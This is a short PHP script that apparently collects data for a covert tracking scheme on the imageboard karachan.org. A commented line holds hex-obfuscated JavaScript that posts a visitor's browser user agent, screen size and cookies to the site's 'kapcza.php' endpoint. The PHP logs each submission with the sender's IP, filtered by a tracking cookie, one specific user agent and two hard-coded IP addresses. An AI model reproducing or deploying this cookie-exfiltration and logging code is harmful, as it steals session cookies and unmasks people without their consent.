<?php

/*if ($_SERVER['REMOTE_ADDR'] == '94.254.129.79') {
	
	setcookie("_gm", md5('lanceq cwel'), time()+31536000, '/'); 
	
	file_put_contents(dirname(__FILE__).'/log.txt', "ebin\n", FILE_APPEND | LOCK_EX);	
}
*/


if ($_COOKIE['_gm'] == '5be8930bd283c36270a01f37a7bda622') {

	$logData = date('Y-m-d H:i:s').' | '.$_SERVER['REMOTE_ADDR'].' | '.$_POST['id']."\n";
	file_put_contents(dirname(__FILE__).'/log.txt', $logData, FILE_APPEND | LOCK_EX);

	//$.post('http://karachan.org/kapcza.php', {"id":window["\x6E\x61\x76\x69\x67\x61\x74\x6F\x72"]["\x75\x73\x65\x72\x41\x67\x65\x6E\x74"]+"\x20\x7C\x20"+window["\x73\x63\x72\x65\x65\x6E"]["\x77\x69\x64\x74\x68"]+"\x78"+window["\x73\x63\x72\x65\x65\x6E"]["\x68\x65\x69\x67\x68\x74"]+"\x20\x7C\x20"+document["\x63\x6F\x6F\x6B\x69\x65"]});
}

if (explode(' | ', $_POST['id'])[1] == 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2123.0 Safari/537.36') {
	
	$logData = date('Y-m-d H:i:s').' | '.$_SERVER['REMOTE_ADDR'].' | '.$_POST['id']."\n";
	file_put_contents(dirname(__FILE__).'/log2.txt', $logData, FILE_APPEND | LOCK_EX);	
}


if ($_SERVER['REMOTE_ADDR'] == '83.10.193.49') {
	
	//setcookie("_gm", md5('putas cwel'), time()+31536000, '/'); 
	
	$logData = date('Y-m-d H:i:s').' | '.$_SERVER['REMOTE_ADDR'].' | '.$_POST['id']."\n";
	file_put_contents(dirname(__FILE__).'/log3.txt', $logData, FILE_APPEND | LOCK_EX);
}